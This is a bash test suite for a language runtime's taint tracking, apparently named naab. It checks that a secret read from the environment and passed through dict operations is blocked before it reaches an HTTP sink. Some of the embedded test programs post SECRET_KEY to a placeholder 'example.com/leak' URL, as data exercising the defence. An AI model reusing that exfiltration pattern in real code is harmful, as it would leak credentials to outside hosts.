#!/usr/bin/env bash
# test_container_taint_vm003.sh — V-VM-003: taint must survive dict/list container mutation
set -euo pipefail

NAAB="${1:-$(dirname "$0")/../../build/naab-lang}"
PASS=0; FAIL=0

ok()   { echo "  PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); }

# Use a single work directory for both scripts AND govern.json.
# naab auto-discovers govern.json by walking up from the script file's directory,
# so governance config must be co-located with (or above) the script files.
WORK_DIR="${HOME}/.naab/vm003_$$"
mkdir -p "$WORK_DIR"
cleanup() { rm -rf "$WORK_DIR"; }
trap cleanup EXIT

# ---------------------------------------------------------------------------
# Governance config: env.get is a taint source, http.post is a sink
#
# This config used to be {"mode":"HARD","taint_sources":[...],"sinks":[...]}:
# none of those are keys the engine reads (they are taint_tracking.sources /
# .sinks, and "HARD" is not a mode), and taint tracking is off by default. The
# suite passed anyway, because enforce mode upgrades the sandbox to `standard`,
# which refuses env.get itself -- the broad greps below matched that refusal
# ("denied"), and taint tracking was never reached. `elevated` lets env.get
# through so the taint path is what decides; the exact-message arms and the
# C1 control below are what prove it.
# ---------------------------------------------------------------------------
cat > "$WORK_DIR/govern.json" <<'EOF'
{
  "version": "5.0",
  "mode": "enforce",
  "security": { "sandbox_level": "elevated" },
  "taint_tracking": { "enabled": true, "level": "hard", "sources": ["env.get"], "sinks": ["http.post"] }
}
EOF

echo "=== test_container_taint_vm003.sh ==="
echo ""

# ---------------------------------------------------------------------------
# T1: tainted env.get → stored in dict → read from dict → http.post → BLOCKED
# ---------------------------------------------------------------------------
echo "[T1] Tainted value stored in dict, read back, passed to http.post — must be blocked"
cat > "$WORK_DIR/vm003_t1.naab" <<'NAAB'
use env
use http
main {
    let secret = env.get("SECRET_KEY")
    let d = {}
    d["k"] = secret
    let x = d["k"]
    http.post("http://example.com/leak", x)
}
NAAB

out=$("$NAAB" "$WORK_DIR/vm003_t1.naab" 2>&1 || true)
if echo "$out" | grep -qi "taint\|sink\|blocked\|governance.*error\|denied\|violation"; then
    ok "taint propagated through dict — http.post blocked"
else
    fail "expected taint block, got: $out"
fi

echo ""

# ---------------------------------------------------------------------------
# T2: clean value stored and read from dict → http.post must NOT be blocked
# ---------------------------------------------------------------------------
echo "[T2] Clean value stored in dict, read back, passed to http.post — must NOT be blocked"
cat > "$WORK_DIR/vm003_t2.naab" <<'NAAB'
use http
main {
    let clean = "hello"
    let d = {}
    d["k"] = clean
    let x = d["k"]
    http.post("http://example.com/ok", x)
}
NAAB

out=$("$NAAB" "$WORK_DIR/vm003_t2.naab" 2>&1 || true)
if echo "$out" | grep -qi "taint.*violat\|taint.*block\|sink.*taint\|tainted.*denied"; then
    fail "false positive — clean dict read blocked: $out"
else
    ok "clean dict read not blocked (no false positive)"
fi

echo ""

# ---------------------------------------------------------------------------
# T3: same as T1 but --no-governance → must run without error
# ---------------------------------------------------------------------------
echo "[T3] Taint scenario with --no-governance — must not block"
cat > "$WORK_DIR/vm003_t3.naab" <<'NAAB'
use env
main {
    let secret = env.get("SECRET_KEY")
    let d = {}
    d["k"] = secret
    let x = d["k"]
    print("no-gov: " + string(x))
}
NAAB

SECRET_KEY="s3cr3t" out=$("$NAAB" --no-governance "$WORK_DIR/vm003_t3.naab" 2>&1 || true)
if echo "$out" | grep -qi "governance.*error\|taint.*block\|violation"; then
    fail "governance fired with --no-governance: $out"
else
    ok "no-governance: ran without governance error"
fi

echo ""

# ---------------------------------------------------------------------------
# T4: tainted value stored via dict.put(), read via dict.get() → http.post → BLOCKED
# ---------------------------------------------------------------------------
echo "[T4] Tainted value via dict.put()/dict.get() — must be blocked"
cat > "$WORK_DIR/vm003_t4.naab" <<'NAAB'
use env
use http
main {
    let secret = env.get("SECRET_KEY")
    let d = {}
    d.put("k", secret)
    let x = d.get("k")
    http.post("http://example.com/leak", x)
}
NAAB

out=$("$NAAB" "$WORK_DIR/vm003_t4.naab" 2>&1 || true)
if echo "$out" | grep -qi "taint\|sink\|blocked\|governance.*error\|denied\|violation"; then
    ok "taint propagated through dict.put/get — http.post blocked"
else
    fail "expected taint block via put/get, got: $out"
fi

echo ""
# ---------------------------------------------------------------------------
# Exact arms. The greps above accept any of seven words, so they also pass on a
# sandbox refusal of env.get ("denied") -- which is what this suite matched for
# as long as its config was inert. These require taint tracking's own message
# AND the HARD exit code, so only the taint path can satisfy them.
# C1 is the control that the source is admitted at all: if the sandbox refused
# env.get, no taint could ever be created and T1x/T4x would be unreachable.
# ---------------------------------------------------------------------------
echo "[T1x] T1 is refused by taint tracking itself (message + exit 3)"
rc=0; out=$("$NAAB" "$WORK_DIR/vm003_t1.naab" 2>&1) || rc=$?
if [[ "$rc" -eq 3 ]] && grep -q "Taint tracking violation" <<<"$out"; then
    ok "dict round-trip: taint tracking blocked http.post (exit 3)"
else
    fail "expected a taint tracking violation with exit 3, got rc=$rc: ${out:0:300}"
fi

echo "[T4x] T4 is refused by taint tracking itself (message + exit 3)"
rc=0; out=$("$NAAB" "$WORK_DIR/vm003_t4.naab" 2>&1) || rc=$?
if [[ "$rc" -eq 3 ]] && grep -q "Taint tracking violation" <<<"$out"; then
    ok "dict.put/get: taint tracking blocked http.post (exit 3)"
else
    fail "expected a taint tracking violation with exit 3, got rc=$rc: ${out:0:300}"
fi

echo "[C1] CONTROL: the sandbox admits the taint source (env.get returns the value)"
cat > "$WORK_DIR/vm003_c1.naab" <<'NAAB'
use env
main {
    print("C1:" + env.get("SECRET_KEY"))
}
NAAB
out=$(SECRET_KEY="c1_value" "$NAAB" "$WORK_DIR/vm003_c1.naab" 2>&1 || true)
if grep -q "C1:c1_value" <<<"$out"; then
    ok "env.get admitted -- taint, not the sandbox, decides T1/T4"
else
    fail "env.get did not return the value -- an outer gate is deciding: ${out:0:300}"
fi

echo ""
TOTAL=$(( PASS + FAIL ))
echo "Results: ${PASS}/${TOTAL} passed"
if [[ "$FAIL" -gt 0 ]]; then exit 1; fi
